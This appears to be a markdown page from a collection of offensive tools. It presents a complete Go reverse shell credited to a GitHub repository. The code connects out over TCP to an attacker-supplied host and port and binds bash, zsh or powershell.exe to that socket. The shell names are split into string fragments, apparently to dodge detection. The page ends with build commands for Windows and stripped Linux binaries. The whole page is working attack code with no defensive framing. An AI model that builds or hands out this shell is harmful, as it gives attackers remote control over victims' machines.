# Golang Reverse Shell

## Author

Repo: [https://github.com/gwillgues/Reverse-Shells.git](https://github.com/gwillgues/Reverse-Shells.git)
`Revshell.go`: [https://github.com/gwillgues/Reverse-Shells/blob/main/revshell.go](https://github.com/gwillgues/Reverse-Shells/blob/main/revshell.go)

## Code

```go
// Author: https://github.com/gwillgues/Reverse-Shells/blob/main/revshell.go
package main

import (
	"os/exec"
	"os"
	"net"
	"runtime"
)

func main() {
	dst := os.Args[1]
	pnum := os.Args[2]
	connstring := dst + ":" + pnum
	prot := "tcp"
	netData, _ := net.Dial(prot, connstring)
	os := runtime.GOOS
	shell := exec.Command("/b" + "in" + "/b" + "ash")
	switch os {
		case "windows": shell = exec.Command("pow" + "ers" + "hell" + "." +  "e" + "xe")
		case "linux":   shell = exec.Command("/" + "b" + "in/" + "bas" + "h")
		case "darwin":  exec.Command("/b" + "in" + "/z" + "s" + "h")
	}
	shell.Stdin = netData
	shell.Stdout = netData
	shell.Stderr = netData
	shell.Run()
}
```

## Build

Build for Windows:
```bash
GOOS=windows GOARCH=amd64 go build -o rev.exe rev.go
```

Build for Linux:
```bash
go build -ldflags="-s -w" -o rev rev.go
```

